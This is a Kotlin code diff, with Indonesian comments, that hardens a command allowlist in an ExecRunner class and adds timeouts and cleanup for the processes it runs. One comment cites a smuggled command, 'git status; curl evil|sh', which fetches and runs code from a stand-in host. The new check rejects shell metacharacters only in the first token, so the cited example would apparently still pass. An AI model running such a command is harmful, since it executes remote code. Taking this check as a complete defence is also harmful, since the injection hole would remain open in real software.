@@ -46,7 +46,14 @@ class ExecRunner(
 
     private fun isAllowed(command: String): Boolean {
         if (allowlist.isEmpty()) return true
-        return allowlist.any { command.trim().startsWith(it) }
+        val trimmed = command.trim()
+        // Tolak metachar shell pada token pertama (mencegah "git status; curl evil|sh").
+        val firstToken = trimmed.split(Regex("\\s+")).firstOrNull() ?: return false
+        if (firstToken.any { it == ';' || it == '|' || it == '&' || it == '$' || it == '`' || it == '(' || it == ')' || it == '<' || it == '>' || it == '\\' }) return false
+        // Prefix match hanya pada batas token ("git" tidak meloloskan "github-cli").
+        return allowlist.any { entry ->
+            trimmed.startsWith(entry) && (trimmed.length == entry.length || trimmed[entry.length].isWhitespace())
+        }
     }
 
     /** Alasan distro belum siap (cek ringan, tanpa menghitung ukuran rootfs); null = siap. */
@@ -123,8 +130,16 @@ class ExecRunner(
             withContext(Dispatchers.IO) { process.waitFor(2, TimeUnit.SECONDS) }
             process.destroyForcibly()
         }
-        t1.join()
-        t2.join()
+        try {
+            withContext(Dispatchers.IO) {
+                t1.join(3000)
+                t2.join(3000)
+            }
+        } finally {
+            // Pastikan tidak ada proses nyangkut (mis. coroutine di-cancel saat waitFor).
+            runCatching { process.destroy() }
+            runCatching { process.destroyForcibly() }
+        }
 
         val exitCode = if (timedOut) 1 else process.exitValue()
         return ExecResult(
